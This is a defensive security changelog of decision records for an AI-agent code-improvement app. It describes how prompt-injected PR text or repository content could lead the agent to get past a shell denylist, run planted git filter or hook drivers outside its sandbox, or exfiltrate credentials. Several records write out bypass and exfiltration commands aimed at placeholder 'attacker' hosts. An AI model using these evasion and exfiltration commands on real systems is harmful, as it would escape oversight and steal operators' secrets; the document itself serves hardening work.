| D-117 | A wrapper long-option value cannot smuggle a forbidden command past the denylist | `shell_command_refusal` strips a command WRAPPER (`env`, `sudo`, `timeout`, …) to check the real command behind it, skipping the wrapper's own options — and their VALUES when a value is a separate word (`nice -n 5 git push`). But it assumed every LONG option (`--x`) was valueless, so `env --unset FOO curl -d @README https://attacker/` left `FOO` as the apparent command (matching nothing) and the real `curl` behind it was never inspected — a data-exfil path an injected review instruction could reach, since the watcher agent's prompt embeds outsider-writable PR text. Fixed by enumerating value-taking wrapper long options (`_WRAPPER_VALUE_TAKING_LONG_OPTIONS`, e.g. `env --unset`/`--chdir`) and consuming their value; an UNLISTED long option is still treated as a flag, which over-checks rather than under-checks (the safe direction for a denylist). A value that is itself a known command/binary is left in place so `env --unset curl git push` still sees `curl`. Test matrix: the exploit and its inline/short/nested-shell variants REFUSE (verified RED against the old valueless-long-option code), while `env --unset FOO pytest`/`--ignore-environment git status` and other benign wrapped commands still pass. Third round of the standing lesson on this branch: a parser that inspects one position is evaded by adding a position. |
| D-142 | Host-side `git` decodes its output leniently, so one binary file cannot kill a watcher | Every watcher died with `STATUS_ERROR` on any repository holding a non-UTF-8 byte. `_git` ran `subprocess.run(..., text=True)`, whose default is a STRICT utf-8 decode, and `_export_is_durable` probes durability with `git diff <base>...HEAD` — a command that prints the CONTENT of changed files. A PNG fixture (`0x89` is the PNG magic byte) or a latin-1 source therefore raised `UnicodeDecodeError` from inside `subprocess.communicate`, which is **not** a failure this helper's callers can read: they inspect `returncode` as data, and D-100 deliberately treats an unreadable diff as "cannot tell". The raise propagated past `_run_agent_pass` into `_run_watcher`'s catch-all and ended the whole nudge loop. Fixed with `errors="replace"`, the convention already used in 164 places (`beacon.py` documents the identical rationale). Replacement is the correct direction here for the reason D-83/D-100 care about: it preserves whether the diff is EMPTY and can never FABRICATE emptiness — a replaced byte is still a byte — so the "produced nothing → the clone holding the only copy of the agent's commits may be deleted" decision stays sound. Two RED-verified tests over a real git repo containing a real binary blob: the diff does not raise, and it is not reported empty. Swept the two sibling helpers whose callers also read content — `spine/driver.py` (`diff HEAD~1..HEAD` / `show`, the direct-push path) and `backend/commit.py` (the secret scan reads a full diff) — and applied the same fix; `spine/gate.py`'s `show` was already correct, reading raw bytes with no `text=True`. Found by running the app's own suite locally while GitHub Actions was in a `major_outage`, so CI had never executed these 4 tests. |
| D-141 | `doas` in the wrapper table is registered with the host-service guard | A rebase pulled in `main`'s new `test_host_service_guard.py::TestRatchet`, which fails on any service-control tool named in `src/` that the host-mutation guard neither covers nor explicitly excludes. It flagged `'doas'` at `spine/agent_runner.py` — a FALSE POSITIVE in substance: that string is a KEY in `_COMMAND_WRAPPERS`, the table that STRIPS privilege/wrapper prefixes so the shell denylist inspects the real command behind them. It is a detector of `doas`, not a spawn of it, and `doas systemctl restart` is still caught on the inner `systemctl` token. Registered in `_DELIBERATELY_UNGUARDED` with that reason — the mechanism the gate's own failure message prescribes — alongside the pre-existing `"sudo"` entry, which is excluded for the identical rationale ("privilege prefix; the wrapped command carries the action") and sits one line above `doas` in the very same dict. 35 tests in that suite pass. Inherited-from-main class, like D-130/D-135. |
| D-140 | The double-click latch on `openSession` is synchronous | `openSession` guarded re-entry with `setBusy(true)` — React state, applied ASYNCHRONOUSLY — so a rapid double-click on "discuss" ran the callback twice before either render landed: both invocations saw "no record", both created a seeded slot, and the second `saveRecord` overwrote the first slot mapping, orphaning a live conversation the user could no longer reach. Fixed with a synchronous `useRef` latch checked and set BEFORE the first `await` and released in `finally` (every exit — resume, fresh, throw — or the subject could never be reopened). Keyed by session rather than a single boolean so opening two DIFFERENT subjects stays parallel. Three RED-verified structural tests: the latch is a ref not React state, it is taken before the first suspension point, and it is released in `finally`. Structural rather than a rendered race because the hook needs Redux + router providers while the property that matters is the ORDERING of the guard against the first `await`. |
| D-139 | The new `ja` locale carries this app's catalog | A rebase pulled in `main`'s new Japanese locale, and `catalogParity.test.ts` (every English key must exist in every non-English catalog IN THE SAME COMMIT) failed with "ja: missing 95 key(s)". Same contract as D-135, a locale that did not exist when that work was done. All 95 were translated into Japanese — the 79 top-level UI keys sourced from `en.manual.json` plus the 16 under `apps.autoImprovement` (`findingDetail`, `manifest`, `setupPanel`) — keeping the product names `Auto-Improvement`/`Auto-Improve`, the protocol tokens `RED`/`GREEN`/`STAYGREEN`/`lint`, and the `{{var}}` placeholders verbatim. Verified with the whole i18n suite (36 files / 521 tests) rather than the parity test alone, because the per-locale STYLE gates are what caught the first pass on `pt`/`zh-CN`/`hi` in D-135; Japanese raised none. |
| D-138 | The stored push destination is pinned by repo IDENTITY, not just host | D-57 host-allowlisted `origin_url` (exact host match, so `evilgithub.com` fails) and the docstring called the rule "about the NETWORK HOST". That is not sufficient: `github.com` IS an allowed host, so an injected `config.json` can keep the host and swap the PATH — `https://github.com/attacker/exfil.git` passed the check and became the push destination for all three exits (draft-PR push, F10 direct push, one-click commit). Fixed by pinning the IDENTITY: a network `origin_url` must name the same `owner/repo` as the validated `target_url`, compared through a new transport-agnostic `_remote_slug` (lower-cased, `.git`-stripped) so `git@github.com:o/r.git` and `https://github.com/o/r.git` compare EQUAL — the ssh form is what `setup_safe_clone` persists whenever `gh` prefers it, and refusing it would degrade every ssh install to queue-only (the regression D-57 was written to avoid). Fail-closed: a mismatch, or a missing/invalid `target_url` leaving nothing to pin against, yields `""` (no push target). A LOCAL path has no slug and stays allowed — it cannot exfiltrate. Two existing tests encoded the weaker contract and were updated rather than deleted: `test_origin_url_wins_when_present` had used MISMATCHED repos (`o/r` vs `a/b`), which is precisely the attack, so it now asserts the matching case wins and a new sibling asserts the repo-swap is refused; the transport-matrix test now passes the real config shape (both keys, same repo). |
| D-137 | The loop's agent refuses to run without credential confinement | The subprocess agent path spawns through `sandboxed_spawn_argv(mode="strict")` + `strip_credential_env`, which hides `~/.aws`/`~/.gnupg`/`gh`/`gcloud`/`kube` stores and scrubs the token env. The PROVIDER path (`SessionAgentRunner`, what `_build_runner` prefers) drives a Kiro Crew session instead, so isolation is whatever the gateway's `sandbox` field gives — and that DEFAULTS TO `"off"`, deferring to kiro-cli's internal agent sandbox, which this app cannot inspect. On a gateway with no effective sandbox, a repository instruction reaching the agent's auto-approved Bash (`python helper.py`) could read those credential stores and exfiltrate over an unrestricted network, with none of the masking the subprocess path enforces. `_build_runner` now consults `_credentials_are_unconfined()` BEFORE constructing the runner and returns `None` (OFFLINE — the same fail-closed answer it already gives when the tool-restricted agent cannot be registered) unless the sandbox is `'auto'` or the operator has acknowledged the residual risk via `acceptUnsandboxedAgentRisk`. The acknowledgement exists deliberately rather than a hard refusal: because `sandbox` defaults to `"off"` on every install, refusing outright would silently take the loop offline for everyone instead of naming the decision — the same one-time-consent shape as the watcher's `watcherAcceptEgressRisk` (D-118), compared with `is True` so a stray `1`/`"yes"` cannot opt in, and the key is added to `_CONFIG_WRITABLE` so it is actually settable. An unreadable config counts as unconfined (a state we cannot verify must not be trusted). Six tests incl. a structural guard that the check PRECEDES the runner construction; two pre-existing tests about runner SELECTION and REGISTRATION now satisfy the new precondition so they keep exercising the paths they name. |
| D-136 | Every exit from a watcher pass checks durability, not just the success path | `_run_agent_pass` had THREE exits but only the success one reached `_export_is_durable`: the runner-exception path (`return True`) and the failed/timed-out-result path (`return True`) both returned BEFORE it. So a pass that edited and COMMITTED inside the isolated clone and then timed out — which `SessionAgentRunner._finish` itself calls an EXPECTED common outcome (`timeout after …`) — left `st.unexported_work` False; on Stop, `_run_watcher`'s `finally` took the `_cleanup_clone` branch and `shutil.rmtree`d the only copy of those commits, because the clone's origin is deliberately dead and no `<fp>.nudge-<n>.diff` had been written. The two doors D-100 (failed diff) and D-101 (uncommitted tree) both live INSIDE `_export_is_durable`, so an early return bypassed the entire protection they exist to provide. Fixed by extracting `_retain_if_work_is_undurable` and calling it on ALL three exits, so success, fault and timeout ask the same question. Three RED-verified tests: a timed-out pass sets `unexported_work`, a faulted pass sets it, and a structural guard asserts ≥3 call sites in `_run_agent_pass` so a fourth exit added later cannot silently reintroduce the data-loss path. **Advisory fixed in the same pass**: two genuinely non-optional, non-circular function-local imports violating `top-level-imports` — `import stat as _stat` in `git_safety._reject_link` and `from kiro_crew.platform_compat import SIGKILL, kill_process_tree` in `agent_runner` — hoisted to their module import blocks (neither carried an `except ImportError` fallback or a circular-import note, which is what the rule exempts). |
| D-135 | The app manifest's display copy is localized, not raw English | A rebase onto `main` pulled in a new gate, `check-app-manifest-sync.mjs`, and it failed with 9 problems: `apps.autoImprovement.manifest.{display_name,description,page_label,highlight_1..6}` "is not in locales/en.json". The gate exists because `displayName`/`description`/`highlights[]`/`ui.pages[].label` are owned by `app.json` on the Python side and the App Store interpolates them RAW, so a non-English user saw this app's card in English while every sibling app was translated. The contract is additive (`app.json` keeps its English verbatim for the CLI and for catalog-less consumers) and has three parts, all of which this branch was missing: (1) the 9 keys must exist in `en.json` with values BYTE-IDENTICAL to the manifest prose; (2) the app needs an entry in `src/components/appstore/appManifest.ts`'s `APP_MANIFEST_KEY` table — without it the resolvers never localize the card AND the 9 keys read as dead to `deadKeys.test.ts`, which pushed that ratchet 24 → 33; (3) `catalogParity.test.ts` demands every English key in all 9 non-English catalogs IN THE SAME COMMIT, so the keys had to be translated, not stubbed. Fixed all three, then cleared the per-locale STYLE gates the new translations tripped: `pt`/`es`/`it` guillemets `«»` → curly quotes, `zh-CN` corner brackets `「」` → curly quotes plus a de-stacked genitive (the rule allows ≤2 `的` per clause; the first draft had 3 in one clause), and `hi` formal `आप` → informal. `en-XA.json` was regenerated (`npm run i18n:pseudo`, 8360 keys) because the pseudolocale must mirror every English key. Verified: manifest-sync `OK: 19 built-in manifests, 168 strings match locales/en.json exactly`, `i18n:check` 13/13 PASS, `src/i18n/` 491/491, and the full frontend suite 9149 passed. Inherited-from-main class, like D-110/D-130: a gate that did not exist when the branch was written. |
| D-134 | Chat-session keys are injective across repos/ids that sanitize alike | `sessionKey(kind, id, repo)` built the key from `safeSegment(repo)`/`safeSegment(id)`, and `safeSegment` is deliberately LOSSY (it collapses path separators and dot-runs). So two distinct repos whose safe form coincides — `team/service-api` and `team-service/api` both → `team-service-api` — produced the SAME session key, and opening the second repo's PR resumed the first repo's conversation (session records live at the shared data root, not under the per-repo workspace). Fixed by appending a fingerprint of the RAW value to each free-form segment (`keySegment` = `safeSegment(raw) + '.' + fnv1a(raw)`), making the mapping injective while keeping the readable prefix and staying inside the backend key validator's charset (`store._SAFE_KEY_RE = ^[A-Za-z0-9][A-Za-z0-9._-]{0,249}$` — `.` and the added length are both allowed). FNV-1a with the 32-bit prime (`Math.imul` truncates to 32-bit, so the 64-bit prime would silently collapse — same caveat documented in `lib/widgetSlug.ts`). RED-verified test: two repos that sanitize to the same safe segment must not share a key (fails against the pre-fix `safeSegment` form); existing exact-literal assertions relaxed to prefix + behavioral guards so they do not pin the hash. |
| D-133 | The canary refuses to certify a custom benchmarkCommand | The Phase-1 canary forces a mechanically-known win by timing a full pytest run (base arm) against `pytest --collect-only` (candidate arm) — the delta is the suite's execution time, correctly signed. But `_time_once` short-circuits to the configured `benchmarkCommand` only for the base arm (`not collect_only`); the candidate arm still runs `pytest --collect-only`. So with a `benchmarkCommand` set, `measure_canary`'s delta compared a benchmark against pytest collection — two unrelated workloads — and any benchmark slower than collection yielded `delta < 0`, clearing the sensitivity check without the ruler ever being exercised (a falsely-certified ruler → the loop optimizes noise). There is no mechanically-known win for an arbitrary command, so `measure_canary` now returns `Measurement(ok=False, …)` immediately when `benchmark_cmd` is set (preflight then reports the canary did not clear and the run halts). RED-verified test: a `SuiteRuler(benchmark_cmd=…)` canary must refuse without running the workload. This was a non-blocking FINDING (advisory) from the Opus review, fixed in the same pass because it fails safe and closes a real reward-hack surface. |
| D-132 | Every host-side git call site pins the attributes, including the ones that bypass `_git` | The Opus review found a THIRD unpinned host-side git call site (after D-129's `clone_setup`): `proposer._capture_diff` runs `git add -A` + `git diff --cached` DIRECTLY (not through `proposer._git`, because it needs `capture_output` and a custom pathspec) over the AGENT-WRITABLE worktree, but never called `require_pinned` — so a planted `filter.<n>.clean` executes on `git add` host-side, the escape `_GIT_SAFE_CONFIG` alone does not stop (only `.git/info/attributes` does). The structural guard `test_every_host_side_git_helper_injects_the_safe_config` was supposed to prevent exactly this, but it checked only `proposer._git`, not `_capture_diff`. Fixed by adding `require_pinned(worktree)` as the first statement of `_capture_diff`, and adding `proposer.Proposer._capture_diff` to the structural test's helper list (RED-verified: the guard now fails without the pin). The lesson repeats D-129's: the anti-drift test only protects the call sites it enumerates — a helper that spawns git inline past the shared `_git` wrapper must be added explicitly. |
| D-131 | RED-base staging copies symlinks verbatim, never dereferencing a credential link | `Gate._stage_test_only_base` snapshots the agent-editable candidate worktree into a sibling RED tree with `shutil.copytree(wt, base_tree)`. The default `symlinks=False` DEREFERENCES symlinks — so a prompt-injected candidate that plants a test symlink (within the edit allowlist) pointing OUT of the tree at `$HOME/.aws/credentials` would have the credential's CONTENTS copied into `base_tree`, where the repo's own `conftest.py`/tests run against the RED tree and could read and exfiltrate it. Fixed with `shutil.copytree(wt, base_tree, symlinks=True)`, which copies each symlink AS A LINK — a dangling/out-of-tree link with no secret content behind it. Behavioral RED-verified test: a worktree carrying a symlink to an out-of-tree secret is staged, and the staged entry must remain a symlink whose stored target is unchanged (fails against the default `copytree`, which materialized the secret bytes). |
| D-130 | Coverage combine survives a traced source that no longer exists | After rebasing onto main's `testpaths = test transfer src/kiro_crew/apps/builtins` (main widened it from a per-file list to the whole builtins dir), the Coverage Combine job failed with `No source for code: /tmp/pytest-of-runner/.../kirocrew-wt-example/src/kiro_crew/agent.py` — `coverage report`/`coverage xml` exit 1 when a traced file is unreadable at report time. The culprit is a PRE-EXISTING `test/` suite (`test_agent_home_isolation.py`) that monkeypatches `agent.__file__` to a `tmp_path` worktree path which is gone by report time; it surfaced because adding this branch's ~1490 in-tree tests to the collection reshuffled the pytest-split shards onto that traced file (Coverage Combine was green on the prior push, with the per-file `testpaths`, and this test is NOT in this branch's diff). Diagnosed here and initially fixed with `ignore_errors = true`; a later rebase found main had INDEPENDENTLY hit the same bug and landed the more surgical remedy — `omit = */kirocrew-wt-example/*` in BOTH `[coverage:run]` and `[coverage:report]` — so this branch took main's version and dropped its own (the conflict is itself the confirmation the diagnosis was right). Same inherited-from-main class as D-110: a rebase onto a moved base can surface a latent gate failure that no line of this diff produced. |
| D-129 | The clone-setup checkout helper fail-closed-pins the git attributes | The consolidation in D-123/D-125 routed seven host-side git helpers through the shared `git_safety` (config + `require_pinned`), but `backend/clone_setup.py`'s `checkout_branch._run` was missed — it re-declared the two `-c` flags inline and never pinned `.git/info/attributes`. `_run` drives `checkout -B <bare>`/`fetch` host-side over the clone the agent edits, and `checkout` runs the SMUDGE filter as it writes the tree, so a repo-planted `filter.<n>.smudge`/`diff.<n>.textconv` bound by an in-tree `.gitattributes` executed outside the sandbox as the gateway user — the exact escape this app's own module documents the `-c` flags do NOT stop (only the attributes pin does). The structural test `test_every_host_side_git_helper_injects_the_safe_config` existed to prevent precisely this drift but its helper list omitted `clone_setup`, so the gap was unguarded. Fixed by aliasing the shared `GIT_SAFE_CONFIG` and calling `require_pinned(clone)` at the top of `_run` (mirroring `backend/commit.py`), then adding `clone_setup.checkout_branch` to all three arms of the structural test (helper list, config-content loop, identity-aliasing loop) — `_run` is a closure so the assertion reads the enclosing function's source. Two RED-verified tests: the structural guard now fails without the fix (`clone_setup.checkout_branch does not inject the git safe-config`), and a deterministic behavioral test asserts the clone's `.git/info/attributes` carries the driver-unbinding pin after the production `checkout_branch` runs (a pin-presence assertion rather than a smudge sentinel, because whether git re-materializes a blob and thus runs smudge depends on checkout internals — the pin is the deterministic witness). |
| D-128 | A bare `&`, and command-substitution `)`, cannot smuggle a forbidden verb past the shell denylist | **Follow-on, same area:** splitting on `$(`/backtick left the CLOSING `)` attached, so `echo $(gh pr ready)` tokenized the verb as `ready)` (≠ `ready`) and cleared the `("pr","ready")` denylist; a bare subshell `(gh pr ready)` is the same shape. Fixed by also splitting on `(` and `)` (never part of a legitimate command word — over-checks in the safe direction), with a RED-verified test covering `$(…)`, VAR=-prefixed subst, assignment-from-subst, bare subshell, backtick, and subshell-after-separator, plus a harmless-substitution non-over-refuse case. **Original:** `shell_command_refusal` splits a command on shell separators before checking each segment's verb, but the split chain covered `&&`, `||`, `;`, `|`, `$(` and backtick — NOT a bare `&`. A single `&` backgrounds its left side and starts a new command exactly like `;`, so `true & gh pr comment --body "<attacker>"` tokenized to `binary='true'` (harmless, absent from every deny table) and the `gh pr comment` behind the `&` returned `""` (allowed); `sleep 1 & curl http://attacker/?d=…` cleared the binary denylist and core's `_governance_denial` the same way (core `security.py` has no generic `gh`/`curl` rule; only `_GIT_PUBLISH_RE` anchors on `[;&|\`\n]`, which is why `git push` alone still failed closed). The watcher grants `Bash` and its prompt has the agent read `gh pr view --comments` — outsider-writable text — so an injected PR comment is the trigger, publishing under the operator's identity: the exact verb the `("pr","comment")` deny entry exists to stop. Fixed by appending `.replace("&", "\n")` to the chain, ordered AFTER the `&&` replace so only the single-`&` separator remains to split on. Tests: the exact exploit plus exfil/nested-shell variants REFUSE (verified RED against the pre-fix chain), and a benign trailing `& true` still passes so the split does not become a blanket refuse-on-`&`. Third instance of the standing lesson on this branch (after the wrapper-option D-117 and the nested-shell path): a parser that inspects fixed positions is evaded by adding a position. |
| D-127 | The git attributes pin lands in the COMMON gitdir for a linked worktree | The `git_safety` pin (see D-123/D-125) is ineffective in the exact case the app runs candidates: a linked `git worktree`. `_resolve_gitdir` returned the PER-WORKTREE gitdir (`.git/worktrees/<id>`), but git reads `info/attributes` from the COMMON gitdir for a linked worktree — measured on git 2.47: an in-tree `.gitattributes` binding `filter=pwn` survives a pin written to the per-worktree `info/attributes` (`check-attr filter` still `pwn`) and is only unset by a pin in the common `info` — so a repository-planted `filter.<n>.clean`/`diff.<n>.textconv` still executed host-side on `git add`/`diff` inside a worktree, outside the sandbox. Fixed with a new `_common_gitdir(gd)` that returns the common gitdir, derived from git's fixed on-disk LAYOUT (`gd.parent.parent`, i.e. `$GIT_COMMON_DIR/worktrees/<id>`) rather than from the agent-writable `commondir` FILE — a repointed `commondir` would otherwise make the pin `O_TRUNC` an arbitrary repo's `info/attributes`, the same arbitrary-write primitive the D-125 `.git`-file backpointer check closes. When a `commondir` file is present it is cross-checked against the layout-derived path and a mismatch RAISES; the derived common dir must itself hold a `HEAD` or it is refused. `gd` reaching this point is already backpointer-validated (D-125), so it is a genuine `worktrees/<id>`. Behavioral test: a clean filter planted in a LINKED WORKTREE does not run when the production `proposer._git(["add","-A"], wt)` stages it — verified RED against the old `return gd` (the filter executed) and GREEN with the fix. |
| D-126 | An untrusted MCP tool NAME is redacted before the SEL and the model | The MCP server redacted tool RESULTS and ARGUMENT-derived errors (D-88), but the tool NAME on the `tools/call` reject paths was still raw. `name` is caller-supplied and reached two readers that must never carry untrusted text: `_audit(name, …)` persists it to the HMAC-signed SEL (not redacted by the writer) and `_error(…, f"unknown tool: {name}")` returns it to the model — so a credential-shaped tool name leaked through both, the same surface D-88 closed for arguments. Fixed by redacting ONCE (`safe_name = _redact_error(name)`) and using it in every audit/error/log mention across the whole branch (unknown-tool, invalid-arguments, invoked, error, success, and the stderr refusal line); the RAW `name` is used only for the `TOOLS` allowlist dict-lookup, which is exact-match and never emitted. Two tests: a credential-shaped tool name does not come back (verified RED pre-fix) and a structural guard that no `_audit`/f-string in the branch references the raw `name`. **Advisory fixed in the same pass**: `agent_runner._governance_denial` had a function-local `from kiro_crew.hooks import …` violating `top-level-imports` — the guard is `except Exception` (fail-closed), NOT the narrow `except ImportError` the rule exempts, so it was a genuine lazy import; hoisted to module scope after verifying no circular import. **Advisory DECLINED with reason**: GPT flagged `agentSession.ts`'s manual `fetch` reads/writes as bypassing React Query. They are not render-driven server state — they run imperatively inside `openSession` (a click handler) as an ordered load → create-slot → save → switch sequence with rollback, dispatching Redux thunks; forcing that atomic command flow through `useMutation` would fragment it and fight the pattern. The file's header documents the direct-`api`/thunk approach as the established precedent (issue-radar, file-explorer, auto-research do the same). Non-blocking. |
| D-125 | The git attributes pin does not follow agent-controlled links and fails CLOSED | A follow-up review of D-123's own `git_safety` module: `pin_attributes` wrote the pin with `Path.write_text` (which FOLLOWS symlinks) and swallowed `OSError` into a silent return. Two holes — the attributes file lands inside a tree the agent can write, so the agent could (1) replace `.git/info/attributes` (or `info`, or `.git`) with a SYMLINK and have the pin write our content THROUGH it, corrupting an arbitrary host file or aiming the write somewhere that re-enables a driver; or (2) make the write fail, after which the old code returned and `git_argv` ran git anyway with the drivers UNNEUTRALIZED — fail-open, the exact escape the pin exists to close. Fixed: every path component is `lstat`-link-checked (`_reject_link`, never followed) and the write uses `os.open(..., O_NOFOLLOW | O_CREAT | O_TRUNC, 0o600)` so a last-instant symlink swap is refused by the kernel (ELOOP), not followed. The pin is now FAIL-CLOSED via `require_pinned`, which raises `GitSafetyError` when a gitdir EXISTS but its pin cannot be safely written — every host-side git helper calls it and a raise REFUSES the git call (a bounded failed pass / degrade-to-queue) rather than running undefended. Crucial distinction that keeps it from over-refusing: a path with NO gitdir is allowed through (a pre-clone probe / non-repo tmp dir has no repo-local config or in-tree `.gitattributes` to bind a driver, so no attribute-execution surface exists) — only a real repo whose pin fails is refused. Caught 7 fixture regressions when the first cut refused non-repo paths, which is how that distinction was found. A third case on the same module is the linked worktree: `.git` is a FILE (`gitdir: <path>`) whose CONTENTS the agent can rewrite, so repointing it at ANOTHER repo's gitdir would make the pin `O_TRUNC` that repo's `info/attributes` (arbitrary write). Fixed by validating git's BIDIRECTIONAL backpointer — the gitdir's own `gitdir` file must point back at THIS worktree's `.git` — and refusing a mismatch (a fourth test: a repointed `.git` raises and the victim repo's attributes stay intact). Also cleaned up an advisory the same review flagged: a function-local `import subprocess as _sp` in `gate.py` (introduced by the D-123 hardening) violated `top-level-imports`; switched to the module-level `subprocess`. |
| D-124 | The nav-item labels no longer clip silently (D-109 recurrence) | The E2E render gate failed `[vs-base]` with exactly one added finding: `apps.layout: 0 -> 1`, a `layout/clipped-without-title` on a sidebar nav label (`"[Àþþş ······]"`, `App.tsx`, en-XA at 2.2x). D-109 fixed this class on the Apps SECTION HEADER and `main` landed the identical fix there — but the two shared nav-item label spans (`whitespace-nowrap overflow-hidden` with no `title`, one per rail item and one per sub-item) were never covered, and this branch's new app entry narrowed the row enough to clip them. Fixed by adding the full, already-translated label to both spans (guarded with a `typeof label === 'string'` check because that prop also accepts a node). Verified by RUNNING the gate against the real base rather than reasoning about it: `PASS [vs-base] — no surface got worse`, exit 0, where the same command previously reported the +1. **Follow-up (found via the E2E ops-spec skip):** the label was first carried on `title`, which broke `ops-mission-control.spec.ts`'s page-wide `page.getByTitle('Settings'/'Board'/…, {exact:true})` — a sidebar nav item titled the same as an ops SegmentedControl segment now matched, and the spec's `.first()` clicked the sidebar item instead of the segment, navigating away so `Autonomy` never rendered → the spec timed out and (being in a `describe.serial` block) skipped its 13 dependents, tripping `MAX_SKIPPED_SPECS=0`. This reproduced on this branch but not on `main` (whose nav spans have no `title`), and only surfaced after a rebase pulled in the ops app. Fixed by carrying the label on `aria-label` instead of `title` — the render gate's clipped-without-title check accepts either (`el.title || el.getAttribute('aria-label')`, render-scan.mjs:567), and `getByTitle` cannot match `aria-label`. Verified locally: the nav-bearing `projects` surface renders `layout=0` with `aria-label`, identical to `title`. Worth recording: the first local run failed with exit 2 (`Rollup failed to resolve import "lottie-web"`) — a gate INFRASTRUCTURE error from a stale local `node_modules`, not a finding; `main` had added the dependency and `npm install` cleared it. Exit 2 and exit 1 mean different things and only exit 1 is a verdict. |
| D-123 | Repository-controlled git FILTER/DIFF drivers cannot execute host-side | D-120 closed the config-named execution vectors (`core.hooksPath`, `core.fsmonitor`) but NOT the ATTRIBUTE-BOUND ones. Measured on git 2.47: with `-c core.hooksPath=<devnull> -c core.fsmonitor=false` set, a repository-planted `filter.pwn.clean` STILL executed on a host-side `git add` — the agent writes the driver into repo-local `.git/config` (`git config filter.pwn.clean 'sh -c …'`, reachable from its auto-approved shell) and binds it with an in-tree `.gitattributes`. `diff.<n>.textconv` is the same shape via `git diff`. Neither `-c core.attributesFile=<devnull>` nor `GIT_CONFIG_GLOBAL/SYSTEM=<devnull>` blocks either (measured): the binding is in-tree and the driver is repo-local. What works is `.git/info/attributes`, which OUTRANKS the in-tree file. **Consolidated into one module** (`spine/git_safety.py`) rather than an eighth copied constant — this finding class recurred six times precisely because each host-side git surface re-declared its own config and a later one omitted a vector; all 8 helpers now alias the shared tuple and call the shared `pin_attributes`, and a structural test asserts identity so a re-declaration fails. The pin is rewritten before EVERY call because the agent can wipe it (measured: wiping it re-opened the hole). **The first pin was wrong in a way the suite caught**: `* -filter -diff -text` marks every path BINARY, so `git diff` emits "Binary files … differ" and this app's own credential scanner (`pr_recipe._scan_pushable_content`) went blind — a hardening change that silently disabled a security control, caught by `TestTheCredentialScanCannotSelfDiff`. The correct pin is `* -filter diff`: `-filter` unbinds clean/smudge, and `diff` SET forces git's BUILT-IN differ (unbinding any `diff=<driver>`) while keeping content readable. Verified all four properties — clean filter blocked, textconv blocked, credential still visible, no binary diff — plus RED-pre-fix behavioral and structural tests. |
| D-122 | Profiler frame trees are redacted before the browser | `GET /findings/{fp}/profile` (`_handle_profile`) and `GET /profiles` (`_handle_profiles`) returned the normalized profiler frame tree RAW. A frame carries function/module/file names captured from the TARGET repo's code, so a credential-shaped identifier there (an `AKIA…`-shaped symbol, a token-shaped path segment) reached the dashboard unscanned — the same egress boundary the findings/session/progress responses already close with `_redact_tree`. Both routes now wrap their payload; numeric timing fields survive (verified) so the flame/sunburst view still renders. Added both to the `TestEveryReaderOfRunEvidenceRedacts` sweep (the enumerated list of browser-facing readers this PR keeps extending as each review finds the next one) plus a behavioral test that a credential-shaped frame name is scrubbed. While here, TIGHTENED that sweep's own check: it matched the redactor name as a bare substring, so a reverted wrap that left an explanatory COMMENT mentioning the redactor slipped past it (caught when the revert-proof passed spuriously) — it now requires the CALL form `redactor(`. |
| D-121 | The orphan-sweep ownership check and deletion are atomic under one lock | D-119's point-of-use recheck (`_clone_is_currently_owned`) took `reg._lock`, RELEASED it, returned, and THEN the caller `rmtree`'d — so the same register-in-the-gap race survived in miniature between the recheck and the delete. Fixed by `_delete_clone_if_unowned`, which holds `reg._lock` across BOTH the ownership check and the `rmtree`, so a directory proven unowned cannot become owned before it is deleted. Because `reg._lock` is a plain, NON-reentrant `Lock` and both `is_alive()` and the bulk snapshot take it, the in-lock check inspects `reg._threads`/`reg._watchers` DIRECTLY (calling the helpers would self-deadlock — the same trap `_live_fps` documents). The `rmtree` runs while the lock is held, briefly blocking watcher registration — acceptable for a rate-limited housekeeping sweep and the price of closing the race without a rename dance; fail-safe (any error → do not delete). Four CI-collected tests: a watcher owned at delete-time is spared, a genuinely-unowned clone is still reclaimed, a structural guard that the lock spans check+rmtree and reads thread state directly (never `is_alive` inside the lock), and a behavioral race test registering a live watcher before the sweep. |
| D-120 | Repository-controlled git hooks cannot execute on the host | The agent runs sandboxed, but the app's OWN git commands (`add`/`commit`/`push`) run on the HOST as the gateway user, in the SAME worktree/clone the agent edits. So a repository instruction that has the auto-approved shell write a hook and point `core.hooksPath` at it would get that hook EXECUTED host-side — OUTSIDE the sandbox — on the next commit or push (`pre-commit`/`pre-push`), a full sandbox escape. `core.fsmonitor` is a second repo-controlled exec vector (a repo can set it to an arbitrary program git then spawns). Fixed by injecting trusted `-c core.hooksPath=<os.devnull> -c core.fsmonitor=false` on EVERY host-side git over an agent-writable tree — `-c` overrides on OUR argv, which take precedence over the repo's own config — centralized in each git helper (`driver._git`, `gate._git_argv`, `commit._git`, `pr_recipe.GitHubPRRecipe._git`) plus the two inline `git push` sites in `driver._push_with_rebase` (push runs `pre-push`). A follow-on case in the same area is the same class in the POST-AGENT presence probes (`agent_runner.author_bug_fix`/`author_perf_fix` run `git status --porcelain` host-side, and `git status` consults+spawns `core.fsmonitor`); both now carry the same overrides. A further case is the watcher's OWN `pr_watchers._git` helper (`remote get-url`/`status`/`diff`) was the one host-side surface left out of both the hardening AND the structural guard's module list — fixed, and the guard now enumerates it. Swept the remaining host-side git helpers for completeness in the same pass: `proposer._git` + its inline `add -A`/`diff`, `agent_discovery._git`, and `clone_setup._run` (which runs `checkout -B` → `post-checkout` hooks on a clone a prior agent pass may have edited). Pure `git apply` sites (driver/commit) are left as-is — apply runs no hooks and does not consult fsmonitor. Verified with a behavioral test that plants a real `pre-commit` hook, points `core.hooksPath` at it, commits through the hardened helper, and asserts the hook's sentinel was NEVER written (RED against the pre-fix helper: the hook fired) while the commit still lands; plus structural guards that every helper and both push sites carry the config and that it disables both hooks and fsmonitor. **Collateral fixed in the same change**: two earlier D-tests (`TestProvisionalCommitFailsClosed`) forced a commit rejection by INSTALLING a `pre-commit` hook — exactly what this fix now (correctly) disables. Retargeted them to fail only the `git commit` subcommand via a wrapped `_git`, a hook-independent trigger that still exercises the real return-code check and staged-diff cleanup they exist for. |
